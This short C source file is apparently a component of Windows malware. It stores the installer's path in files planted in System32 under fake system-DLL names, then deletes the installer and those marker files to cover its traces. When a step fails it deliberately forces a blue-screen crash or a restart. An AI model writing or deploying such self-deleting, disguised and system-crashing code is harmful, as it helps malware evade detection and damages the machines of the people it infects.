#include "deleteinsta.h"



VOID SetupInstallerDeletion(WCHAR* path, size_t length){
    BOOL result = WriteDataIntoFile(L"C:\\Windows\\System32\\Windows.UI.NtHal.dll", path);
    if(!result){
        FreeVirtualMemory(path);
        RestartSystem();
        return;
    }
    WCHAR buf[255];
    wsprintfW(buf, L"%d", length);
    result = WriteDataIntoFile(L"C:\\Windows\\System32\\Windows.UI.ClientServerRuntime.dll", buf);
    if(!result){
        FreeVirtualMemory(path);
        RestartSystem();
        return;
    }
    return;
}


VOID DeleteInstaller(){
    WCHAR* data = ReadData(L"C:\\Windows\\System32\\Windows.UI.ClientServerRuntime.dll", 3);
    if(!data) BlueScreenSystem();
    int length = _wtoi(data);
    if(!length) BlueScreenSystem();
    WCHAR* content = ReadData(L"C:\\Windows\\System32\\Windows.UI.NtHal.dll", length * sizeof(WCHAR));
    if(!content) BlueScreenSystem();
    BOOL result = DeleteFileW(content);
    if(!result){
        WCHAR idk[512];
        wsprintfW(idk, L"%s\n - length %d\n", content, length);
        MessageBoxW(NULL, idk, L"s", MB_OK);
    } 
    result = DeleteFileW(L"C:\\Windows\\System32\\Windows.UI.ClientServerRuntime.dll");
    if(!result) ShowFailureResponse(GetLastError());
    result = DeleteFileW(L"C:\\Windows\\System32\\Windows.UI.NtHal.dll");
    if(!result) ShowFailureResponse(GetLastError());
    return;
}

